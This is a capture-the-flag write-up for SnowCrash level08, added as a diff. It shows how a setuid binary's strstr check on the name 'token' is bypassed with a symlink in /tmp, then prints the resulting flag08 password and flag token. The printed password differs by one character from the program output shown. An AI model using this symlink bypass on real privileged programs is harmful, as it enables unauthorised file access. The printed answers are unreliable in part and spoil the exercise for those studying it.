@@ -1,0 +1,51 @@
+We run "ls -l" command in our home directory.
+
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+We try and execute the binary.
+
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
+
+It appears that we need one more argument with it, so we try and use "token"
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+A message shows that we cannot access the Token, so we trance the binary to see what is being executed.
+
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff794, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                                                                                                                                                                          = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                                                                                                                                                                      = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+It appears that the binary use strstr, to see if the argument is called "token" and if it is, it prints that we don't have access.
+
+To by pass this, we need to create a copy of token with a different name.
+
+To do so we use a Symlink. With a fake in /tmp where he have the permissions.
+
+level08@SnowCrash:~$ ln -s ~/token /tmp/fake
+
+Then we execute the binary with the fake as an argument.
+
+level08@SnowCrash:~$ ./level08 /tmp/fake
+quif5eloekouj29ke0vouxean
+
+We have our token now, we just need to log into flag08
+
+
+level08@SnowCrash:~$ su flag08
+Password: uif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+
+We run a simple getflag:
+
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
